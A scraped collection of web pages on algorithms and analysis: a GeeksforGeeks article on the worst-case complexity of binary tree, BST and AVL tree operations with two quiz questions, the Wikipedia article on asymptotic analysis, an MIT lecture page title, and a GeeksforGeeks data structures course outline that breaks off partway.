AVL tree Last Updated: 22-11-2018 In this article, we will discuss complexity of different operations in binary trees including BST and AVL trees. Before understanding this article, you should have basic idea about: Binary Tree, Binary Search Tree and AVL Tree. The main operations in binary tree are: search, insert and delete. We will see the worst case time complexity of these operations in binary trees. Binary Tree – In a binary tree, a node can have maximum two children. Consider the left skewed binary tree shown in Figure 1. Searching: For searching element 2, we have to traverse all elements (assuming we do breadth first traversal). Therefore, searching in binary tree has worst case complexity of O(n). Insertion: For inserting element as left child of 2, we have to traverse all elements. Therefore, insertion in binary tree has worst case complexity of O(n). Deletion: For deletion of element 2, we have to traverse all elements to find 2 (assuming we do breadth first traversal). Therefore, deletion in binary tree has worst case complexity of O(n). Binary Search Tree (BST) – BST is a special type of binary tree in which left child of a node has value less than the parent and right child has value greater than parent. Consider the left skewed BST shown in Figure 2. Searching: For searching element 1, we have to traverse all elements (in order 3, 2, 1). Therefore, searching in binary search tree has worst case complexity of O(n). In general, time complexity is O(h) where h is height of BST. Insertion: For inserting element 0, it must be inserted as left child of 1. Therefore, we need to traverse all elements (in order 3, 2, 1) to insert 0 which has worst case complexity of O(n). In general, time complexity is O(h). Deletion: For deletion of element 1, we have to traverse all elements to find 1 (in order 3, 2, 1). Therefore, deletion in binary tree has worst case complexity of O(n). In general, time complexity is O(h). AVL/ Height Balanced Tree – AVL tree is binary search tree with additional property that difference between height of left sub-tree and right sub-tree of any node can’t be more than 1. For example, BST shown in Figure 2 is not AVL as difference between left sub-tree and right sub-tree of node 3 is 2. However, BST shown in Figure 3 is AVL tree. Searching: For searching element 1, we have to traverse elements (in order 5, 4, 1) = 3 = log2n. Therefore, searching in AVL tree has worst case complexity of O(log2n). Insertion: For inserting element 12, it must be inserted as right child of 9. Therefore, we need to traverse elements (in order 5, 7, 9) to insert 12 which has worst case complexity of O(log2n). Deletion: For deletion of element 9, we have to traverse elements to find 9 (in order 5, 7, 9). Therefore, deletion in binary tree has worst case complexity of O(log2n). We will discuss questions based on complexities of binary tree operations. Que-1. What is the worst case time complexity for search, insert and delete operations in a general Binary Search Tree? (A) O(n) for all (B) O(Logn) for all (C) O(Logn) for search and insert, and O(n) for delete (D) O(Logn) for search, and O(n) for insert and delete Solution: As discussed, all operations in BST have worst case time complexity of O(n). So, the correct option is (A). Que-2. What are the worst case time complexities of searching in binary tree, BST and AVL tree respectively? (A) O(n) for all (B) O(Logn) for all (C) O(n) for binary tree, and O(Logn) for others (D) O(n) for binary tree and BST, and O(Logn) for AVL Solution: As discussed, search operation in binary tree and BST have worst case time complexity of O(n). However, AVL tree has worst case time complexity of O(logn). So, the correct option is (D). Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Complexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapAVL Tree | Set 1 (Insertion)AVL Tree | Set 2 (Deletion)Practice questions on Height balanced/AVL TreeAVL with duplicate keysDifference between Binary Tree and Binary Search TreeC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotBinary Tree to Binary Search Tree ConversionMinimum swap required to convert binary tree to binary search treeBinary Tree to Binary Search Tree Conversion using STL setWhat does 'Space Complexity' mean?Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyGATE CS 2016 Sec 5 – Time Space ComplexityTime complexity of recursive Fibonacci programPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)This article is contributed by Sonal Tuteja. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : nitinshivanandmesta Article Tags : AnalysisGATE CSTree Practice Tags : Tree thumb_up 26 To-do Done 1.7 Based on 9 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Introduction of Operating System – Set 1 Next last_page BCD to 7 Segment Decoder Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in GATE CS Layers of OSI ModelACID Properties in DBMSTypes of Operating SystemsPage Replacement Algorithms in Operating SystemsFunctions of Operating System room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Asymptotic analysis - Wikipedia Asymptotic analysis From Wikipedia, the free encyclopedia Jump to navigation Jump to search Description of limiting behavior of a function This article is about the behavior of functions as inputs approach infinity, or some other limit value. For asymptotes in geometry, see Asymptote. In mathematical analysis, asymptotic analysis, also known as asymptotics, is a method of describing limiting behavior. As an illustration, suppose that we are interested in the properties of a function f(n) as n becomes very large. If f(n) = n2 + 3n, then as n becomes very large, the term 3n becomes insignificant compared to n2. The function f(n) is said to be "asymptotically equivalent to n2, as n → ∞". This is often written symbolically as f(n) ~ n2, which is read as "f(n) is asymptotic to n2". An example of an important asymptotic result is the prime number theorem. Let π(x) denote the prime-counting function (which is not directly related to the constant pi), i.e. π(x) is the number of prime numbers that are less than or equal to x. Then the theorem states that π ( x ) ∼ x ln ⁡ x . {\displaystyle \pi (x)\sim {\frac {x}{\ln x}}.} Contents 1 Definition 2 Properties 3 Examples of asymptotic formulas 4 Construction 4.1 General 4.2 Asymptotic to two different polynomials 5 Asymptotic expansion 5.1 Examples of asymptotic expansions 5.2 Worked example 6 Asymptotic distribution 7 Applications 8 See also 9 Notes 10 References 11 External links Definition[edit] Formally, given functions f(x) and g(x), we define a binary relation f ( x ) ∼ g ( x ) ( as x → ∞ ) {\displaystyle f(x)\sim g(x)\quad ({\text{as }}x\to \infty )} if and only if (de Bruijn 1981, §1.4) lim x → ∞ f ( x ) g ( x ) = 1. {\displaystyle \lim _{x\to \infty }{\frac {f(x)}{g(x)}}=1.} The symbol ~ is the tilde. The relation is an equivalence relation on the set of functions of x; the functions f and g are said to be asymptotically equivalent. The domain of f and g can be any set for which the limit is defined: e.g. real numbers, complex numbers, positive integers. The same notation is also used for other ways of passing to a limit: e.g. x → 0, x ↓ 0, |x| → 0. The way of passing to the limit is often not stated explicitly, if it is clear from the context. Although the above definition is common in the literature, it is problematic if g(x) is zero infinitely often as x goes to the limiting value. For that reason, some authors use an alternative definition. The alternative definition, in little-o notation, is that f ~ g if and only if f ( x ) = g ( x ) ( 1 + o ( x ) ) . {\displaystyle f(x)=g(x)(1+o(x)).} This definition is equivalent to the prior definition if g(x) is not zero in some neighbourhood of the limiting value.[1][2] Properties[edit] If f ∼ g {\displaystyle f\sim g} and a ∼ b {\displaystyle a\sim b} , then under some mild conditions, the following hold. f r ∼ g r {\displaystyle f^{r}\sim g^{r}} , for every real r log ⁡ ( f ) ∼ log ⁡ ( g ) {\displaystyle \log(f)\sim \log(g)} f × a ∼ g × b {\displaystyle f\times a\sim g\times b} f / a ∼ g / b {\displaystyle f/a\sim g/b} Such properties allow asymptotically-equivalent functions to be freely exchanged in many algebraic expressions. Examples of asymptotic formulas[edit] Factorial n ! ∼ 2 π n ( n e ) n {\displaystyle n!\sim {\sqrt {2\pi n}}\left({\frac {n}{e}}\right)^{n}} —this is Stirling's approximation Partition function For a positive integer n, the partition function, p(n), gives the number of ways of writing the integer n as a sum of positive integers, where the order of addends is not considered. p ( n ) ∼ 1 4 n 3 e π 2 n 3 {\displaystyle p(n)\sim {\frac {1}{4n{\sqrt {3}}}}e^{\pi {\sqrt {\frac {2n}{3}}}}} Airy function The Airy function, Ai(x), is a solution of the differential equation y'' − xy = 0; it has many applications in physics. Ai ⁡ ( x ) ∼ e − 2 3 x 3 2 2 π x 1 / 4 {\displaystyle \operatorname {Ai} (x)\sim {\frac {e^{-{\frac {2}{3}}x^{\frac {3}{2}}}}{2{\sqrt {\pi }}x^{1/4}}}} Hankel functions H α ( 1 ) ( z ) ∼ 2 π z e i ( z − 2 π α − π 4 ) H α ( 2 ) ( z ) ∼ 2 π z e − i ( z − 2 π α − π 4 ) {\displaystyle {\begin{aligned}H_{\alpha }^{(1)}(z)&\sim {\sqrt {\frac {2}{\pi z}}}e^{i\left(z-{\frac {2\pi \alpha -\pi }{4}}\right)}\\H_{\alpha }^{(2)}(z)&\sim {\sqrt {\frac {2}{\pi z}}}e^{-i\left(z-{\frac {2\pi \alpha -\pi }{4}}\right)}\end{aligned}}} Construction[edit] General[edit] Consider: h ( x ) = f ( x ) ( 1 − F ( x ) ) + g ( x ) F ( x ) {\displaystyle h(x)=f(x)(1-F(x))+g(x)F(x)} where f ( x ) {\displaystyle f(x)} and g ( x ) {\displaystyle g(x)} are real-valued analytic functions, and F ( x ) {\displaystyle F(x)} is a Cumulative distribution function. Then h ( x ) {\displaystyle h(x)} is asymptotic to f ( x ) {\displaystyle f(x)} as x → ( − ∞ ) {\displaystyle x\to (-\infty )} and asymptotic to g ( x ) {\displaystyle g(x)} as x → ( + ∞ ) {\displaystyle x\to (+\infty )} . Asymptotic to two different polynomials[edit] Suppose we want a real-valued function that is asymptotic to ( a 0 + a 1 x ) {\displaystyle (a_{0}+a_{1}x)} as x → ( − ∞ ) {\displaystyle x\to (-\infty )} and is asymptotic to ( b 0 + b 1 x ) {\displaystyle (b_{0}+b_{1}x)} as x → ( + ∞ ) {\displaystyle x\to (+\infty )} . Then h ( x ) = ( a 0 + a 1 x ) ( 1 − F ( x ) ) + ( b 0 + b 1 x ) F ( x ) {\displaystyle h(x)=(a_{0}+a_{1}x)(1-F(x))+(b_{0}+b_{1}x)F(x)} will do this. Asymptotic expansion[edit] Main article: Asymptotic expansion An asymptotic expansion of a function f(x) is in practice an expression of that function in terms of a series, the partial sums of which do not necessarily converge, but such that taking any initial partial sum provides an asymptotic formula for f. The idea is that successive terms provide an increasingly accurate description of the order of growth of f. In symbols, it means we have f ∼ g 1 , {\displaystyle f\sim g_{1},} but also f − g 1 ∼ g 2 {\displaystyle f-g_{1}\sim g_{2}} and f − g 1 − ⋯ − g k − 1 ∼ g k {\displaystyle f-g_{1}-\cdots -g_{k-1}\sim g_{k}} for each fixed k. In view of the definition of the ∼ {\displaystyle \sim } symbol, the last equation means f − ( g 1 + ⋯ + g k ) = o ( g k ) {\displaystyle f-(g_{1}+\cdots +g_{k})=o(g_{k})} in the little o notation, i.e., f − ( g 1 + ⋯ + g k ) {\displaystyle f-(g_{1}+\cdots +g_{k})} is much smaller than g k . {\displaystyle g_{k}.} The relation f − g 1 − ⋯ − g k − 1 ∼ g k {\displaystyle f-g_{1}-\cdots -g_{k-1}\sim g_{k}} takes its full meaning if g k + 1 = o ( g k ) {\displaystyle g_{k+1}=o(g_{k})} for all k, which means the g k {\displaystyle g_{k}} form an asymptotic scale. In that case, some authors may abusively write f ∼ g 1 + ⋯ + g k {\displaystyle f\sim g_{1}+\cdots +g_{k}} to denote the statement f − ( g 1 + ⋯ + g k ) = o ( g k ) . {\displaystyle f-(g_{1}+\cdots +g_{k})=o(g_{k}).} One should however be careful that this is not a standard use of the ∼ {\displaystyle \sim } symbol, and that it does not correspond to the definition given in § Definition. In the present situation, this relation g k = o ( g k − 1 ) {\displaystyle g_{k}=o(g_{k-1})} actually follows from combining steps k and k−1; by subtracting f − g 1 − ⋯ − g k − 2 = g k − 1 + o ( g k − 1 ) {\displaystyle f-g_{1}-\cdots -g_{k-2}=g_{k-1}+o(g_{k-1})} from f − g 1 − ⋯ − g k − 2 − g k − 1 = g k + o ( g k ) , {\displaystyle f-g_{1}-\cdots -g_{k-2}-g_{k-1}=g_{k}+o(g_{k}),} one gets g k + o ( g k ) = o ( g k − 1 ) , {\displaystyle g_{k}+o(g_{k})=o(g_{k-1}),} i.e. g k = o ( g k − 1 ) . {\displaystyle g_{k}=o(g_{k-1}).} In case the asymptotic expansion does not converge, for any particular value of the argument there will be a particular partial sum which provides the best approximation and adding additional terms will decrease the accuracy. This optimal partial sum will usually have more terms as the argument approaches the limit value. Examples of asymptotic expansions[edit] Gamma function e x x x 2 π x Γ ( x + 1 ) ∼ 1 + 1 12 x + 1 288 x 2 − 139 51840 x 3 − ⋯ ( x → ∞ ) {\displaystyle {\frac {e^{x}}{x^{x}{\sqrt {2\pi x}}}}\Gamma (x+1)\sim 1+{\frac {1}{12x}}+{\frac {1}{288x^{2}}}-{\frac {139}{51840x^{3}}}-\cdots \ (x\to \infty )} Exponential integral x e x E 1 ( x ) ∼ ∑ n = 0 ∞ ( − 1 ) n n ! x n ( x → ∞ ) {\displaystyle xe^{x}E_{1}(x)\sim \sum _{n=0}^{\infty }{\frac {(-1)^{n}n!}{x^{n}}}\ (x\to \infty )} Error function π x e x 2 e r f c ( x ) ∼ 1 + ∑ n = 1 ∞ ( − 1 ) n ( 2 n − 1 ) ! ! n ! ( 2 x 2 ) n ( x → ∞ ) {\displaystyle {\sqrt {\pi }}xe^{x^{2}}{\rm {erfc}}(x)\sim 1+\sum _{n=1}^{\infty }(-1)^{n}{\frac {(2n-1)!!}{n!(2x^{2})^{n}}}\ (x\to \infty )} where (2n − 1)!! is the double factorial. Worked example[edit] Asymptotic expansions often occur when an ordinary series is used in a formal expression that forces the taking of values outside of its domain of convergence. For example, we might start with the ordinary series 1 1 − w = ∑ n = 0 ∞ w n {\displaystyle {\frac {1}{1-w}}=\sum _{n=0}^{\infty }w^{n}} The expression on the left is valid on the entire complex plane w ≠ 1 {\displaystyle w\neq 1} , while the right hand side converges only for | w | < 1 {\displaystyle |w|<1} . Multiplying by e − w / t {\displaystyle e^{-w/t}} and integrating both sides yields ∫ 0 ∞ e − w t 1 − w d w = ∑ n = 0 ∞ t n + 1 ∫ 0 ∞ e − u u n d u {\displaystyle \int _{0}^{\infty }{\frac {e^{-{\frac {w}{t}}}}{1-w}}\,dw=\sum _{n=0}^{\infty }t^{n+1}\int _{0}^{\infty }e^{-u}u^{n}\,du} The integral on the left hand side can be expressed in terms of the exponential integral. The integral on the right hand side, after the substitution u = w / t {\displaystyle u=w/t} , may be recognized as the gamma function. Evaluating both, one obtains the asymptotic expansion e − 1 t Ei ⁡ ( 1 t ) = ∑ n = 0 ∞ n ! t n + 1 {\displaystyle e^{-{\frac {1}{t}}}\operatorname {Ei} \left({\frac {1}{t}}\right)=\sum _{n=0}^{\infty }n!\;t^{n+1}} Here, the right hand side is clearly not convergent for any non-zero value of t. However, by keeping t small, and truncating the series on the right to a finite number of terms, one may obtain a fairly good approximation to the value of Ei ⁡ ( 1 / t ) {\displaystyle \operatorname {Ei} (1/t)} . Substituting x = − 1 / t {\displaystyle x=-1/t} and noting that Ei ⁡ ( x ) = − E 1 ( − x ) {\displaystyle \operatorname {Ei} (x)=-E_{1}(-x)} results in the asymptotic expansion given earlier in this article. Asymptotic distribution[edit] Main article: Asymptotic distribution In mathematical statistics, an asymptotic distribution is a hypothetical distribution that is in a sense the "limiting" distribution of a sequence of distributions. A distribution is an ordered set of random variables Zi for i = 1, ..., n, for some positive integer n. An asymptotic distribution allows i to range without bound, that is, n is infinite. A special case of an asymptotic distribution is when the late entries go to zero—that is, the Zi go to 0 as i goes to infinity. Some instances of "asymptotic distribution" refer only to this special case. This is based on the notion of an asymptotic function which cleanly approaches a constant value (the asymptote) as the independent variable goes to infinity; "clean" in this sense meaning that for any desired closeness epsilon there is some value of the independent variable after which the function never differs from the constant by more than epsilon. An asymptote is a straight line that a curve approaches but never meets or crosses. Informally, one may speak of the curve meeting the asymptote "at infinity" although this is not a precise definition. In the equation y = 1 x , {\displaystyle y={\frac {1}{x}},} y becomes arbitrarily small in magnitude as x increases. Applications[edit] Asymptotic analysis is used in several mathematical sciences. In statistics, asymptotic theory provides limiting approximations of the probability distribution of sample statistics, such as the likelihood ratio statistic and the expected value of the deviance. Asymptotic theory does not provide a method of evaluating the finite-sample distributions of sample statistics, however. Non-asymptotic bounds are provided by methods of approximation theory. Examples of applications are the following. In applied mathematics, asymptotic analysis is used to build numerical methods to approximate equation solutions. In mathematical statistics and probability theory, asymptotics are used in analysis of long-run or large-sample behaviour of random variables and estimators. in computer science in the analysis of algorithms, considering the performance of algorithms. the behavior of physical systems, an example being statistical mechanics. in accident analysis when identifying the causation of crash through count modeling with large number of crash counts in a given time and space. Asymptotic analysis is a key tool for exploring the ordinary and partial differential equations which arise in the mathematical modelling of real-world phenomena.[3] An illustrative example is the derivation of the boundary layer equations from the full Navier-Stokes equations governing fluid flow. In many cases, the asymptotic expansion is in power of a small parameter, ε: in the boundary layer case, this is the nondimensional ratio of the boundary layer thickness to a typical lengthscale of the problem. Indeed, applications of asymptotic analysis in mathematical modelling often[3] center around a nondimensional parameter which has been shown, or assumed, to be small through a consideration of the scales of the problem at hand. Asymptotic expansions typically arise in the approximation of certain integrals (Laplace's method, saddle-point method, method of steepest descent) or in the approximation of probability distributions (Edgeworth series). The Feynman graphs in quantum field theory are another example of asymptotic expansions which often do not converge. See also[edit] Asymptote Asymptotic computational complexity Asymptotic density (in number theory) Asymptotic theory (statistics) Asymptotology Big O notation Leading-order term Method of dominant balance (for ODEs) Method of matched asymptotic expansions Watson's lemma Notes[edit] ^ "Asymptotic equality", Encyclopedia of Mathematics, EMS Press, 2001 [1994] ^ Estrada & Kanwal (2002, §1.2) ^ a b Howison, S. (2005), Practical Applied Mathematics, Cambridge University Press References[edit] Balser, W. (1994), From Divergent Power Series To Analytic Functions, Springer-Verlag, ISBN 9783540485940 de Bruijn, N. G. (1981), Asymptotic Methods in Analysis, Dover Publications, ISBN 9780486642215 Estrada, R.; Kanwal, R. P. (2002), A Distributional Approach to Asymptotics, Birkhäuser, ISBN 9780817681302 Miller, P. D. (2006), Applied Asymptotic Analysis, American Mathematical Society, ISBN 9780821840788 Murray, J. D. (1984), Asymptotic Analysis, Springer, ISBN 9781461211228 Paris, R. B.; Kaminsky, D. (2001), Asymptotics and Mellin-Barnes Integrals, Cambridge University Press External links[edit] Asymptotic Analysis —home page of the journal, which is published by IOS Press A paper on time series analysis using asymptotic distribution Retrieved from "https://en.wikipedia.org/w/index.php?title=Asymptotic_analysis&oldid=987127824" Categories: Asymptotic analysisMathematical seriesHidden categories: Articles with short descriptionShort description matches Wikidata Navigation menu Personal tools Not logged inTalkContributionsCreate accountLog in Namespaces ArticleTalk Variants Views ReadEditView history More Search Navigation Main pageContentsCurrent eventsRandom articleAbout WikipediaContact usDonate Contribute HelpLearn to editCommunity portalRecent changesUpload file Tools What links hereRelated changesUpload fileSpecial pagesPermanent linkPage informationCite this pageWikidata item Print/export Download as PDFPrintable version Languages CatalàDeutschEspañolفارسیItalianoMagyarമലയാളംNederlandsPortuguêsРусскийУкраїнськаTiếng Việt中文 Edit links This page was last edited on 5 November 2020, at 02:34 (UTC). Text is available under the Creative Commons Attribution-ShareAlike License; additional terms may apply. By using this site, you agree to the Terms of Use and Privacy Policy. Wikipedia® is a registered trademark of the Wikimedia Foundation, Inc., a non-profit organization. Privacy policy About Wikipedia Disclaimers Contact Wikipedia Mobile view Developers Statistics Cookie statement

Lec 1 | MIT 6.046J / 18.410J Introduction to Algorithms (SMA 5503), Fall 2005 - YouTubeAboutPressCopyrightContact usCreatorAdvertiseDevelopersTermsPrivacyPolicy & SafetyHow YouTube worksTest new features© 2020 Google LLC

Course | Data Structures and Algorithms Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Data Structures and Algorithms Self Paced Course Learn Data Structures & Algorithms at your own pace to prepare for top product-based companies like Amazon, Uber, Adobe, etc Students, Working Professionals Online Course Data Structures and Algorithms Active 4999 2499 71.41 35.70 4.9 View Testimonials Login to Sign Up for Free Course Features 200+ algorithmic coding problems Lifetime access to the Course Track-based learning Weekly assessment tests Premium Lecture videos by Mr. Sandeep Jain (CEO & Founder, GeeksforGeeks) Course Completion Certificate trusted by top universities and companies Internship Opportunities at GeeksforGeeks Access to the GeeksforGeeks Jobs portal Course Overview This course is a complete package that helps you learn Data Structures and Algorithms from basic to an advanced level. The course curriculum has been divided into 10 weeks where you can practice questions & attempt the assessment tests according to your own pace. The course offers you a wealth of programming challenges that will help you to prepare for interviews with top-notch companies like Microsoft, Amazon, Adobe etc. You will learn algorithmic techniques for solving various problems with full flexibility of time. With this course, you can study at your own pace and need not hurry or puzzle yourself. This course does not require any prior knowledge of Data Structure and Algorithms, but a basic knowledge of any programming language ( C++ / Java) will be helpful. What You Will Learn Learn Data Structures and Algorithms from basic to advanced level Learn Topic-wise implementation of different Data Structures & Algorithms Improve your problem-solving skills to become a stronger developer Develop your analytical skills on Data Structures and use them efficiently Solve problems asked in product-based companies’ interviews Solve problems in contests similar to coding round for SDE role Course Content Introduction Analysis of Algorithm Background analysis through a Program and its functions. Order of Growth A mathematical explanation of the growth analysis through limits and functions. A direct way of calculating the order of growth Asymptotic Notations Best, Average and Worst case explanation through a program. Big O Notation Graphical and mathematical explanation. Calculation Applications at Linear Search Omega Notation Graphical and mathematical explanation. Calculation. Theta Notation Graphical and mathematical explanation. Calculation. Analysis of common loops Single, multiple and nested loops Analysis of Recursion Various calculations through Recursion Tree method Space Complexity Basic Programs Auxiliary Space Space Analysis of Recursion Space Analysis of Fibonacci number Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Mathematics Mathematics Count Digits Palindrome Numbers Factorial of Numbers GCD of Two Numbers LCM of Two Numbers Check for Prime Prime Factors Sieve of Eratosthenes Computing Power Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Bit Magic Bitwise Operators in C++ Operation of AND, OR, XOR operators Operation of Left Shift, Right Shift and Bitwise Not Bitwise Operators in Java Operation of AND, OR Operation of Bitwise Not, Left Shift Operation of Right Shift and unsigned Right Shift Problem(With Video Solutions): Check Kth bit is set or not Method 1: Using the left Shift. Method 2: Using the right shift Problem(With Video Solutions): Count Set Bits Method 1: Simple method Method 2: Brian and Kerningham Algorithm Method 3: Using Lookup Table Problems(With Video Solutions): To check whether a number is a power of 2 or not Odd occurrences in an array. Two numbers having odd occurrences in an array. Generate power set using bitwise operators. Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Recursion Introduction to Recursion Applications of Recursion Writing base cases in Recursion Factorial N-th Fibonacci number Various problems on Recursion(With Video Solutions) Print n to 1 Print 1 to n Tail Recursion Checking Palindrome Sum of digits Rod cutting Subsets of a set Tower of Hanoi Problem Josephus Problem Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Arrays Introduction and Advantages Types of Arrays Fixed-sized array Dynamic-sized array Operations on Arrays Searching Insertions Deletion Arrays vs other DS Reversing - Explanation with complexity Problems(With Video Solutions) Left Rotation of the array by 1 Check if Sorted Left Rotation of the array by D places Leaders in an Array Maximum Difference Problem Frequencies in Sorted Array Stock Buy and Sell Problem Trapping Rainwater Problem Maximum Consecutive 1s Maximum Subarray Sum Longest Even-Odd Subarray Maximum Circular sum subarray. Majority Element Minimum Consecutive Flips Sliding Window Technique Prefix Sum Technique Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Searching Binary Search Iterative and Recursive Binary Search and various associated problems(With Video Solutions) Index of First Occurence in Sorted Array Index of Last Occurence in Sorted Array Count of occurrences of x in sorted element Count of 1s in a binary sorted array Find an element in sorted and rotated array Peak element Find an element in an infinite sized sorted array The square root of an integer Two Pointer Approach Problems(With Video Solutions) Find pair in an unsorted array which gives sum X Find pair in a sorted array which gives sum X Find triplet in an array which gives sum X Problems(With Video Solutions) Median of two sorted arrays Majority Element Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Sorting Implementation of C++ STL sort() function in Arrays and Vectors Time Complexities Sorting in Java Arrays.sort() in Java Collection.sort() in Java Stability in Sorting Algorithms Examples of Stable and Unstable Algos Insertion Sort Merge Sort Problems(With Video Solutions) Intersection of 2 sorted arrays Union of 2 sorted arrays Count Inversions in arrays Partitions(With Video Solutions) Naive Lomuto Hoare Quick Sort Using Lomuto and Hoare Time and Space analysis Choice of Pivot and Worst case Tail call elimination Problems(With Video Solutions) Kth Smallest element Chocolate Distribution Problem Sorting arrays with 2 and3 types of elements Merge Overlapping Intervals Meeting the Maximum Guests Cycle Sort Counting Sort Radix Sort Bucket Sort Overview of Sorting Algorithms Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Matrix Introduction to Matrix in C++ and Java Multidimensional Matrix Pass Matrix as Argument Printing matrix in a snake pattern Transposing a matrix Rotating a Matrix Check if the element is present in a row and column-wise sorted matrix. Boundary Traversal Spiral Traversal Matrix Multiplication Search in row-wise and column-wise Sorted Matrix Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Hashing Introduction and Time complexity analysis Application of Hashing Discussion on Direct Address Table Working and examples on various Hash Functions Introduction and Various techniques on Collision Handling Chaining and its implementation Open Addressing and its Implementation Chaining V/S Open Addressing Double Hashing C++ Unordered Set Unordered Map Java HashSet HashMap Problems(With Video Solutions): Count Distinct Elements Count of the frequency of array elements The intersection of two arrays Union of two unsorted arrays Pair with given sum in an unsorted array Subarray with zero-sum Subarray with given sum Longest subarray with a given sum Longest subarray with an equal number of 0’s and 1’s Longest common span with the same sum in a binary array Longest Consecutive Subsequence Count Distinct elements in every window More than n/k Occurences Optimized More than n/k Solution Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Strings Discussion of String DS Strings in CPP Strings in Java Problems(With Video Solutions): Given a string, check if they are an anagram of each other. Given a string, find the leftmost character that repeats. Given a string, find the leftmost character that does not repeat. Given a string, find the lexicographic rank of it in O(n) time. Implementation of the previously discussed lexicographic rank problem. Given a text string and a pattern string, find if a permutation of the pattern exists in the text. Given two strings, check if they are rotations of each other or not. Various Pattern Searching Algorithms. Rabin Karp Algorithm KMP Algorithm Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Linked List Introduction Implementation in CPP Implementation in Java Comparison with Array DS Doubly Linked List Circular Linked List Loop Problems Detecting Loops Detecting loops using Floyd cycle detection Detecting and Removing Loops in Linked List Problems(With Video Solutions): Middle of Linked List Nth node from the end of linked list Deleting a Node without accessing Head pointer of Linked List An iterative method to Reverse a linked list Recursive method to reverse a linked list Reverse in group of size k Segregating even-odd nodes of linked list The intersection of two linked list Pairwise swap nodes of linked list Clone a linked list using a random pointer LRU Cache Design Merge two Sorted Linked Lists Palindrome Linked List Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Stack Understanding the Stack data structure Applications of Stack Implementation of Stack in Array and Linked List In C++ In Java Problems(With Video Solutions): Balanced Parenthesis Two stacks in an array K Stacks in an array Stock span problem with variations Previous Greater Element Next Greater Element Largest Rectangular Area in a Histogram Understanding getMin() in Stack with O(1) Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Queue Introduction and Application Implementation of the queue using array and LinkedList In C++ STL In Java Stack using queue Problems(With Video Solutions) Reversing a Queue Generate numbers with given digits First Circular Tour Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Deque Introduction and Application Implementation In C++ STL In Java Problems(With Video Solutions) Maximums of all subarrays of size k ArrayDeque in Java Design a DS with min max operations Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Tree Introduction Tree Application Binary Tree Tree Traversal Implementation of: Inorder Traversal Preorder Traversal Postorder Traversal Level Order Traversal (Line by Line) Tree Traversal in Spiral Form Problems(With Video Solutions): Size of Binary Tree Maximum in Binary Tree Height of Binary Tree Print Nodes at K distance Print Left View of Binary Tree Children Sum Property Check for Balanced Binary Tree Maximum Width of Binary Tree Convert Binary Tree to Doubly Linked List Construct Binary Tree from Inorder and Preorder Tree Traversal Spiral Form The diameter of a Binary Tree LCA problem with an efficient solution Burn A Binary Tree from a Leaf Count Nodes in a complete Binary Tree Serialize and Deserialize a Binary tree Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Binary Search Tree Background, Introduction and Application Implementation of Search in BST In CPP In Java Insertion in BST In CPP In Java Deletion in BST In CPP In Java Floor in BST In CPP In Java Self Balancing BST AVL Tree Red Black Tree Set in C++ STL Map in C++ STL BST Introduction TreeSet in java TreeMap in Java Problems(With Video Solutions): The ceiling of a key in BST Ceiling on the left side in an array Find Kth Smallest in BST Check for BST Fix BST with Two Nodes Swapped Pair Sum with given BST Vertical Sum in a Binary Tree Vertical Traversal of Binary Tree Top View of Binary Tree Bottom View of Binary Tree Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Heap Introduction & Implementation Binary Heap Insertion Heapify and Extract Decrease Key, Delete 